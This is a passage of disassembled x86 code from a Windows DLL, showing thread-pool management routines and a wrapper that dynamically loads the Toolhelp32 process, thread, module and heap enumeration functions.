		push	0FFFFFFFFh
		lea	eax, [edi+74h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [edi+38h]
		xor	ebx, ebx
		inc	ebx
		jmp	short loc_6AF5061A
; ---------------------------------------------------------------------------

loc_6AF505ED:				; CODE XREF: Ordinal1412+58j
		mov	ecx, [esi]
		push	[ebp+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF50608
		push	offset aCthreadpoolDes ; "CThreadPool::Destroy() : (*pos)->Termin"...
		call	sub_6AF3102E
		pop	ecx
		xor	ebx, ebx

loc_6AF50608:				; CODE XREF: Ordinal1412+34j
		mov	ecx, [esi]
		test	ecx, ecx
		jz	short loc_6AF50614
		mov	eax, [ecx]
		push	1
		call	dword ptr [eax]

loc_6AF50614:				; CODE XREF: Ordinal1412+47j
		and	dword ptr [esi], 0
		add	esi, 4

loc_6AF5061A:				; CODE XREF: Ordinal1412+26j
		cmp	esi, [edi+3Ch]
		jnz	short loc_6AF505ED
		lea	ecx, [edi+34h]
		call	sub_6AF50389
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	4
Ordinal1412	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF50638	proc near		; CODE XREF: Ordinal1422+B8p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	esi, ecx
		call	sub_6AF501F5
		mov	ecx, esi
		mov	edi, eax
		call	sub_6AF501E2
		cmp	edi, eax
		push	[ebp+arg_0]
		mov	ecx, esi
		jnb	short loc_6AF50665
		push	1
		push	dword ptr [esi+8]
		call	sub_6AF503A8
		mov	[esi+8], eax
		jmp	short loc_6AF50672
; ---------------------------------------------------------------------------

loc_6AF50665:				; CODE XREF: sub_6AF50638+1Cj
		mov	eax, [esi+8]
		push	eax		; Src
		lea	eax, [ebp+arg_0]
		push	eax		; int
		call	sub_6AF50542

loc_6AF50672:				; CODE XREF: sub_6AF50638+2Bj
		pop	edi
		pop	esi
		pop	ebp
		retn	4
sub_6AF50638	endp

; Exported entry 1409.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1409
Ordinal1409	proc near		; CODE XREF: sub_6AF50853+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		push	0
		mov	dword ptr [esi], offset	off_6AF6085C
		call	Ordinal1412
		lea	ecx, [esi+74h]
		call	Ordinal1279
		lea	ecx, [esi+5Ch]
		call	Ordinal1379
		lea	ecx, [esi+4Ch]
		call	Ordinal1221
		lea	ecx, [esi+44h]
		call	Ordinal1315
		lea	ecx, [esi+34h]
		call	sub_6AF50389
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1361
Ordinal1409	endp

; Exported entry 1422.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1422
Ordinal1422	proc near		; CODE XREF: Ordinal1410+96p
					; Ordinal1416+5Fp
					; DATA XREF: ...

var_54		= dword	ptr -54h
var_50		= byte ptr -50h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_122	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		xor	ebx, ebx
		push	edi
		mov	esi, ecx
		mov	edi, [esi+38h]
		inc	ebx
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], ebx
		jmp	short loc_6AF506EE
; ---------------------------------------------------------------------------

loc_6AF506E0:				; CODE XREF: Ordinal1422+39j
		mov	ecx, [edi]
		call	Ordinal1394
		test	eax, eax
		jz	short loc_6AF506F5
		add	edi, 4

loc_6AF506EE:				; CODE XREF: Ordinal1422+26j
		cmp	edi, [esi+3Ch]
		jnz	short loc_6AF506E0
		jmp	short loc_6AF50702
; ---------------------------------------------------------------------------

loc_6AF506F5:				; CODE XREF: Ordinal1422+31j
		mov	edi, [edi]
		and	[ebp+var_2C], 0
		test	edi, edi
		mov	[ebp+var_30], edi
		jnz	short loc_6AF5071C

loc_6AF50702:				; CODE XREF: Ordinal1422+3Bj
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+14h]
		mov	edi, eax
		test	edi, edi
		mov	[ebp+var_30], edi
		jnz	short loc_6AF50719
		push	offset aCthreadpoolCre ; "CThreadPool::CreateThread() :	AllocateT"...
		jmp	short loc_6AF5073B
; ---------------------------------------------------------------------------

loc_6AF50719:				; CODE XREF: Ordinal1422+58j
		mov	[ebp+var_2C], ebx

loc_6AF5071C:				; CODE XREF: Ordinal1422+48j
		mov	ebx, [edi]
		xor	eax, eax
		push	eax
		push	eax
		lea	ecx, [esi+44h]
		push	eax
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		push	eax
		push	esi		; Args
		mov	ecx, edi
		call	dword ptr [ebx+18h]
		test	eax, eax
		jnz	short loc_6AF5074A
		push	offset aCthreadpoolC_0 ; "CThreadPool::CreateThread() :	pThread->"...

loc_6AF5073B:				; CODE XREF: Ordinal1422+5Fj
		call	sub_6AF3102E
		and	[ebp+var_28], 0
		pop	ecx
		jmp	loc_6AF50839
; ---------------------------------------------------------------------------

loc_6AF5074A:				; CODE XREF: Ordinal1422+7Cj
		cmp	[ebp+var_2C], 0
		jz	loc_6AF50839
		push	offset aCthreadpoolC_1 ; "CThreadPool::CreateThread()"
		lea	ecx, [ebp+var_50]
		call	Ordinal751
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_30]
		push	eax
		lea	ecx, [esi+34h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF50638
		jmp	loc_6AF50815
; ---------------------------------------------------------------------------

loc_6AF5077A:				; DATA XREF: .rdata:6AF644F0o
		push	13h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	ecx, [ebp+var_2C]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF50812
		retn
; ---------------------------------------------------------------------------

loc_6AF507BD:				; DATA XREF: .rdata:6AF64500o
		push	15h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	eax, [ebp+var_54]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF50812
		retn
; ---------------------------------------------------------------------------

loc_6AF50812:				; DATA XREF: Ordinal1422+FFo
					; Ordinal1422+154o
		mov	edi, [ebp+var_30]

loc_6AF50815:				; CODE XREF: Ordinal1422+BDj
		and	[ebp+var_4], 0
		lea	ecx, [ebp+var_50]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF50831
		mov	eax, [edi]
		push	1
		mov	ecx, edi
		call	dword ptr [eax]
		and	[ebp+var_28], 0

loc_6AF50831:				; CODE XREF: Ordinal1422+16Bj
		lea	ecx, [ebp+var_50]
		call	Ordinal752

loc_6AF50839:				; CODE XREF: Ordinal1422+8Dj
					; Ordinal1422+96j
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+var_28]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal1422	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF50853(void *, char)
sub_6AF50853	proc near		; DATA XREF: .rdata:off_6AF6085Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1409
		test	[esp+4+arg_0], 1
		jz	short loc_6AF50869
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF50869:				; CODE XREF: sub_6AF50853+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF50853	endp

; Exported entry 1410.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1410
Ordinal1410	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
Value		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		xor	ebx, ebx
		cmp	[ebp+Value], ebx
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF50892
		push	offset aCthreadpoolC_2 ; "CThreadPool::Create()	: dwThreadCount	="...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF5092F
; ---------------------------------------------------------------------------

loc_6AF50892:				; CODE XREF: Ordinal1410+Fj
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+74h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	ecx, esi
		call	Ordinal1413
		test	eax, eax
		jz	short loc_6AF508B9
		push	offset aCthreadpoolC_3 ; "CThreadPool::Create()	: IsThreadPool() "...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF50925
; ---------------------------------------------------------------------------

loc_6AF508B9:				; CODE XREF: Ordinal1410+3Bj
		push	edi		; Args
		lea	edi, [esi+44h]
		mov	ecx, edi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF508E5
		push	ebx		; int
		push	ebx		; lpString2
		push	ebx		; bInitialState
		push	ebx		; bManualReset
		push	ebx		; lpEventAttributes
		mov	ecx, edi
		call	Ordinal1317
		test	eax, eax
		jnz	short loc_6AF508E5
		push	offset aCthreadpoolC_4 ; "CThreadPool::Create()	: m_AddEvent.Crea"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF50924
; ---------------------------------------------------------------------------

loc_6AF508E5:				; CODE XREF: Ordinal1410+57j
					; Ordinal1410+67j
		mov	ecx, edi
		call	Ordinal1324
		push	ebx
		lea	ecx, [esi+4Ch]
		call	Ordinal1223
		xor	edi, edi
		cmp	[ebp+Value], ebx
		mov	[ebp+var_4], 1
		jbe	short loc_6AF50914

loc_6AF50903:				; CODE XREF: Ordinal1410+A3j
		mov	ecx, esi
		call	Ordinal1422
		test	eax, eax
		jz	short loc_6AF50935
		inc	edi
		cmp	edi, [ebp+Value]
		jb	short loc_6AF50903

loc_6AF50914:				; CODE XREF: Ordinal1410+92j
		push	[ebp+Value]	; Value
		add	esi, 58h
		push	esi		; Target
		call	ds:InterlockedExchange

loc_6AF50921:				; CODE XREF: Ordinal1410+DDj
		mov	ebx, [ebp+var_4]

loc_6AF50924:				; CODE XREF: Ordinal1410+74j
		pop	edi

loc_6AF50925:				; CODE XREF: Ordinal1410+48j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	eax, ebx

loc_6AF5092F:				; CODE XREF: Ordinal1410+1Ej
		pop	esi
		pop	ebx
		leave
		retn	4
; ---------------------------------------------------------------------------

loc_6AF50935:				; CODE XREF: Ordinal1410+9Dj
		push	offset aCthreadpoolC_5 ; "CThreadPool::Create()	: CreateThread() "...
		call	sub_6AF3102E
		pop	ecx
		push	0FFFFFFFFh
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal1412
		jmp	short loc_6AF50921
Ordinal1410	endp

; Exported entry 1416.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1416
Ordinal1416	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		mov	esi, [ebp+arg_0]
		test	esi, esi
		push	edi
		mov	edi, ecx
		jnz	short loc_6AF50971
		push	offset aCthreadpoolSet ; "CThreadPool::SetThreadCount()	: dwThrea"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF50A6D
; ---------------------------------------------------------------------------

loc_6AF50971:				; CODE XREF: Ordinal1416+Fj
		push	ebx		; Args
		push	0
		push	0FFFFFFFFh
		lea	eax, [edi+74h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		push	0		; Value
		lea	ebx, [edi+58h]
		push	ebx		; Addend
		call	ds:InterlockedExchangeAdd
		sub	esi, eax
		mov	[ebp+arg_0], esi
		jnz	short loc_6AF5099D
		xor	esi, esi
		inc	esi
		jmp	loc_6AF50A62
; ---------------------------------------------------------------------------

loc_6AF5099D:				; CODE XREF: Ordinal1416+45j
		xor	esi, esi
		cmp	[ebp+arg_0], esi
		mov	[ebp+var_4], 1
		jle	short loc_6AF509DC

loc_6AF509AB:				; CODE XREF: Ordinal1416+73j
		mov	ecx, edi
		call	Ordinal1422
		test	eax, eax
		jz	short loc_6AF509C8
		push	ebx		; lpAddend
		call	ds:InterlockedIncrement
		inc	esi
		cmp	esi, [ebp+arg_0]
		jl	short loc_6AF509AB
		jmp	loc_6AF50A5F
; ---------------------------------------------------------------------------

loc_6AF509C8:				; CODE XREF: Ordinal1416+66j
		push	offset aCthreadpoolS_0 ; "CThreadPool::SetThreadCount()	: CreateT"...
		call	sub_6AF3102E
		and	[ebp+var_4], 0
		pop	ecx
		jmp	loc_6AF50A5F
; ---------------------------------------------------------------------------

loc_6AF509DC:				; CODE XREF: Ordinal1416+5Bj
		mov	esi, [edi+38h]
		mov	ebx, ds:InterlockedDecrement
		jmp	short loc_6AF50A21
; ---------------------------------------------------------------------------

loc_6AF509E7:				; CODE XREF: Ordinal1416+D6j
		cmp	[ebp+arg_0], 0
		jz	short loc_6AF50A26
		mov	ecx, [esi]
		call	Ordinal1394
		test	eax, eax
		jz	short loc_6AF50A1E
		mov	ecx, [esi]
		call	Ordinal1395
		test	eax, eax
		jnz	short loc_6AF50A1E
		mov	ecx, [esi]
		call	Ordinal1403
		test	eax, eax
		jnz	short loc_6AF50A1E
		mov	ecx, [esi]
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		inc	[ebp+arg_0]
		lea	eax, [edi+58h]
		push	eax		; lpAddend
		call	ebx ; InterlockedDecrement

loc_6AF50A1E:				; CODE XREF: Ordinal1416+A8j
					; Ordinal1416+B3j ...
		add	esi, 4

loc_6AF50A21:				; CODE XREF: Ordinal1416+97j
		cmp	esi, [edi+3Ch]
		jnz	short loc_6AF509E7

loc_6AF50A26:				; CODE XREF: Ordinal1416+9Dj
		mov	esi, [edi+38h]
		jmp	short loc_6AF50A5A
; ---------------------------------------------------------------------------

loc_6AF50A2B:				; CODE XREF: Ordinal1416+10Fj
		cmp	[ebp+arg_0], 0
		jz	short loc_6AF50A5F
		mov	ecx, [esi]
		call	Ordinal1394
		test	eax, eax
		jz	short loc_6AF50A57
		mov	ecx, [esi]
		call	Ordinal1395
		test	eax, eax
		jnz	short loc_6AF50A57
		mov	ecx, [esi]
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		inc	[ebp+arg_0]
		lea	eax, [edi+58h]
		push	eax		; lpAddend
		call	ebx ; InterlockedDecrement

loc_6AF50A57:				; CODE XREF: Ordinal1416+ECj
					; Ordinal1416+F7j
		add	esi, 4

loc_6AF50A5A:				; CODE XREF: Ordinal1416+DBj
		cmp	esi, [edi+3Ch]
		jnz	short loc_6AF50A2B

loc_6AF50A5F:				; CODE XREF: Ordinal1416+75j
					; Ordinal1416+89j ...
		mov	esi, [ebp+var_4]

loc_6AF50A62:				; CODE XREF: Ordinal1416+4Aj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	eax, esi
		pop	ebx

loc_6AF50A6D:				; CODE XREF: Ordinal1416+1Ej
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal1416	endp

; Exported entry 1428.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1428
Ordinal1428	proc near		; CODE XREF: Ordinal1423+12p
					; Ordinal1427+5p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		xor	edi, edi
		cmp	[esp+8+arg_0], edi
		mov	esi, ecx
		jz	short loc_6AF50A8C
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF50BBE

loc_6AF50A8C:				; CODE XREF: Ordinal1428+Aj
		push	ebx
		xor	ebx, ebx
		inc	ebx
		cmp	[esp+0Ch+arg_0], edi
		jnz	short loc_6AF50ABF
		mov	[esi+8], edi
		mov	[esi+0Ch], edi
		mov	[esi+10h], edi
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	[esi+1Ch], edi
		mov	[esi+20h], edi
		mov	[esi+24h], edi
		mov	[esi+28h], edi
		mov	[esi+2Ch], edi
		mov	[esi+30h], edi
		mov	[esi+34h], edi
		jmp	loc_6AF50BBB
; ---------------------------------------------------------------------------

loc_6AF50ABF:				; CODE XREF: Ordinal1428+21j
		push	offset aCreatetoolhelp ; "CreateToolhelp32Snapshot"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+8], eax
		jnz	short loc_6AF50AD4
		xor	ebx, ebx

loc_6AF50AD4:				; CODE XREF: Ordinal1428+5Dj
		push	offset aHeap32first ; "Heap32First"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+0Ch], eax
		jnz	short loc_6AF50AE9
		xor	ebx, ebx

loc_6AF50AE9:				; CODE XREF: Ordinal1428+72j
		push	offset aHeap32listfirs ; "Heap32ListFirst"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+10h], eax
		jnz	short loc_6AF50AFE
		xor	ebx, ebx

loc_6AF50AFE:				; CODE XREF: Ordinal1428+87j
		push	offset aHeap32listnext ; "Heap32ListNext"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+14h], eax
		jnz	short loc_6AF50B13
		xor	ebx, ebx

loc_6AF50B13:				; CODE XREF: Ordinal1428+9Cj
		push	offset aHeap32next ; "Heap32Next"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+18h], eax
		jnz	short loc_6AF50B28
		xor	ebx, ebx

loc_6AF50B28:				; CODE XREF: Ordinal1428+B1j
		push	offset aThread32first ;	"Thread32First"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+1Ch], eax
		jnz	short loc_6AF50B3D
		xor	ebx, ebx

loc_6AF50B3D:				; CODE XREF: Ordinal1428+C6j
		push	offset aThread32next ; "Thread32Next"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+20h], eax
		jnz	short loc_6AF50B52
		xor	ebx, ebx

loc_6AF50B52:				; CODE XREF: Ordinal1428+DBj
		push	offset aToolhelp32read ; "Toolhelp32ReadProcessMemory"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+24h], eax
		jnz	short loc_6AF50B67
		xor	ebx, ebx

loc_6AF50B67:				; CODE XREF: Ordinal1428+F0j
		push	offset aModule32first ;	"Module32First"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+28h], eax
		jnz	short loc_6AF50B7C
		xor	ebx, ebx

loc_6AF50B7C:				; CODE XREF: Ordinal1428+105j
		push	offset aModule32next ; "Module32Next"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+2Ch], eax
		jnz	short loc_6AF50B91
		xor	ebx, ebx

loc_6AF50B91:				; CODE XREF: Ordinal1428+11Aj
		push	offset aProcess32first ; "Process32First"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+30h], eax
		jnz	short loc_6AF50BA6
		xor	ebx, ebx

loc_6AF50BA6:				; CODE XREF: Ordinal1428+12Fj
		push	offset aProcess32next ;	"Process32Next"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+34h], eax
		jnz	short loc_6AF50BBB
		xor	ebx, ebx

loc_6AF50BBB:				; CODE XREF: Ordinal1428+47j
					; Ordinal1428+144j
		mov	eax, ebx
		pop	ebx

loc_6AF50BBE:				; CODE XREF: Ordinal1428+13j
		pop	edi
		pop	esi
		retn	4
Ordinal1428	endp

; Exported entry 1423.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1423
Ordinal1423	proc near		; CODE XREF: Ordinal1346+20p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		push	0
		mov	ecx, esi
		mov	dword ptr [esi], offset	off_6AF60B4C
		call	Ordinal1428
		mov	eax, esi
		pop	esi
		retn
Ordinal1423	endp

; Exported entry 1425.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1425(LPCSTR Args)
		public Ordinal1425
Ordinal1425	proc near		; CODE XREF: Ordinal1429+Fp
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF50BF9
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF50C00

loc_6AF50BF9:				; CODE XREF: Ordinal1425+Ej
		xor	eax, eax
		jmp	loc_6AF50D03
; ---------------------------------------------------------------------------

loc_6AF50C00:				; CODE XREF: Ordinal1425+19j
		push	edi
		xor	edi, edi
		push	offset aCreatetoolhelp ; "CreateToolhelp32Snapshot"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF50C19
		xor	edi, edi

loc_6AF50C19:				; CODE XREF: Ordinal1425+37j
		push	offset aHeap32first ; "Heap32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF50C2E
		xor	edi, edi

loc_6AF50C2E:				; CODE XREF: Ordinal1425+4Cj
		push	offset aHeap32listfirs ; "Heap32ListFirst"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF50C43
		xor	edi, edi

loc_6AF50C43:				; CODE XREF: Ordinal1425+61j
		push	offset aHeap32listnext ; "Heap32ListNext"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+14h], eax
		jnz	short loc_6AF50C58
		xor	edi, edi

loc_6AF50C58:				; CODE XREF: Ordinal1425+76j
		push	offset aHeap32next ; "Heap32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+18h], eax
		jnz	short loc_6AF50C6D
		xor	edi, edi

loc_6AF50C6D:				; CODE XREF: Ordinal1425+8Bj
		push	offset aThread32first ;	"Thread32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+1Ch], eax
		jnz	short loc_6AF50C82
		xor	edi, edi

loc_6AF50C82:				; CODE XREF: Ordinal1425+A0j
		push	offset aThread32next ; "Thread32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+20h], eax
		jnz	short loc_6AF50C97
		xor	edi, edi

loc_6AF50C97:				; CODE XREF: Ordinal1425+B5j
		push	offset aToolhelp32read ; "Toolhelp32ReadProcessMemory"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+24h], eax
		jnz	short loc_6AF50CAC
		xor	edi, edi

loc_6AF50CAC:				; CODE XREF: Ordinal1425+CAj
		push	offset aModule32first ;	"Module32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+28h], eax
		jnz	short loc_6AF50CC1
		xor	edi, edi

loc_6AF50CC1:				; CODE XREF: Ordinal1425+DFj
		push	offset aModule32next ; "Module32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+2Ch], eax
		jnz	short loc_6AF50CD6
		xor	edi, edi

loc_6AF50CD6:				; CODE XREF: Ordinal1425+F4j
		push	offset aProcess32first ; "Process32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+30h], eax
		jnz	short loc_6AF50CEB
		xor	edi, edi

loc_6AF50CEB:				; CODE XREF: Ordinal1425+109j
		push	offset aProcess32next ;	"Process32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+34h], eax
		jnz	short loc_6AF50D00
		xor	edi, edi

loc_6AF50D00:				; CODE XREF: Ordinal1425+11Ej
		mov	eax, edi
		pop	edi

loc_6AF50D03:				; CODE XREF: Ordinal1425+1Dj
		pop	esi
		retn	4
Ordinal1425	endp

; Exported entry 1426.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1426(LPCSTR Args, DWORD dwFlags)
		public Ordinal1426
Ordinal1426	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF50D26
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF50D2D

loc_6AF50D26:				; CODE XREF: Ordinal1426+12j
		xor	eax, eax
		jmp	loc_6AF50E30
; ---------------------------------------------------------------------------

loc_6AF50D2D:				; CODE XREF: Ordinal1426+1Dj
		push	edi
		xor	edi, edi
		push	offset aCreatetoolhelp ; "CreateToolhelp32Snapshot"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF50D46
		xor	edi, edi

loc_6AF50D46:				; CODE XREF: Ordinal1426+3Bj
		push	offset aHeap32first ; "Heap32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF50D5B
		xor	edi, edi

loc_6AF50D5B:				; CODE XREF: Ordinal1426+50j
		push	offset aHeap32listfirs ; "Heap32ListFirst"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF50D70
		xor	edi, edi

loc_6AF50D70:				; CODE XREF: Ordinal1426+65j
		push	offset aHeap32listnext ; "Heap32ListNext"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+14h], eax
		jnz	short loc_6AF50D85
		xor	edi, edi

loc_6AF50D85:				; CODE XREF: Ordinal1426+7Aj
		push	offset aHeap32next ; "Heap32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+18h], eax
		jnz	short loc_6AF50D9A
		xor	edi, edi

loc_6AF50D9A:				; CODE XREF: Ordinal1426+8Fj
		push	offset aThread32first ;	"Thread32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+1Ch], eax
		jnz	short loc_6AF50DAF
		xor	edi, edi

loc_6AF50DAF:				; CODE XREF: Ordinal1426+A4j
		push	offset aThread32next ; "Thread32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+20h], eax
		jnz	short loc_6AF50DC4
		xor	edi, edi

loc_6AF50DC4:				; CODE XREF: Ordinal1426+B9j
		push	offset aToolhelp32read ; "Toolhelp32ReadProcessMemory"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+24h], eax
		jnz	short loc_6AF50DD9
		xor	edi, edi

loc_6AF50DD9:				; CODE XREF: Ordinal1426+CEj
		push	offset aModule32first ;	"Module32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+28h], eax
		jnz	short loc_6AF50DEE
		xor	edi, edi

loc_6AF50DEE:				; CODE XREF: Ordinal1426+E3j
		push	offset aModule32next ; "Module32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+2Ch], eax
		jnz	short loc_6AF50E03
		xor	edi, edi

loc_6AF50E03:				; CODE XREF: Ordinal1426+F8j
		push	offset aProcess32first ; "Process32First"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+30h], eax
		jnz	short loc_6AF50E18
		xor	edi, edi

loc_6AF50E18:				; CODE XREF: Ordinal1426+10Dj
		push	offset aProcess32next ;	"Process32Next"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+34h], eax
		jnz	short loc_6AF50E2D
		xor	edi, edi

loc_6AF50E2D:				; CODE XREF: Ordinal1426+122j
		mov	eax, edi
		pop	edi

loc_6AF50E30:				; CODE XREF: Ordinal1426+21j
		pop	esi
		retn	8
Ordinal1426	endp

; Exported entry 1427.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1427
Ordinal1427	proc near		; CODE XREF: Ordinal1430j
					; Ordinal1424+9p ...
		push	esi
		push	0
		mov	esi, ecx
		call	Ordinal1428
		mov	ecx, esi
		pop	esi
		jmp	Ordinal898
Ordinal1427	endp

; Exported entry 1430.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1430
Ordinal1430	proc near		; CODE XREF: Ordinal1349+Ep
					; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal1427
